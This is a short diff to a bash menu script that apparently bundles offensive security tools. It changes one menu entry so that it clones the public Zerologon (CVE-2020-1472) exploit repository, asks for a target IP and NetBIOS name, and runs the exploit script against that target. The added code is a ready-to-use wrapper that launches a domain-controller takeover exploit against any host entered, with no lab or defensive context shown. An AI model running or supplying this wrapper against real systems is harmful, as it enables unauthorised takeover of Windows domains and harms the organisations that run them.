@@ -9961,7 +9961,22 @@ while true; do
 		Clona "anbud/DroidDucky"
 	;;
 	"2414")
-		Clona "dirkjanm/CVE-2020-1472"
+
+		if [[ ! -d "./CVE-2020-1472" ]];
+		then
+			Clona "dirkjanm/CVE-2020-1472"
+		fi
+		echo "Digit the Target IP"
+		read -p "(example, 192.168.1.12): " TIP
+		if [[ "$TIP" != "" ]];
+		then
+			echo "Digit the Target NetBIOS name"
+			read -p "(example, PC_WORKGROUP): " TDOM
+			if [[ "$TDOM" != "" ]];
+			then
+				./CVE-2020-1472/cve-2020-1472-exploit.py "$TDOM" "$TIP"
+			fi
+		fi
 	;;
 	"2415")
 		Scarica https://digi.ninja/files/bucket_finder_1.1.tar.bz2
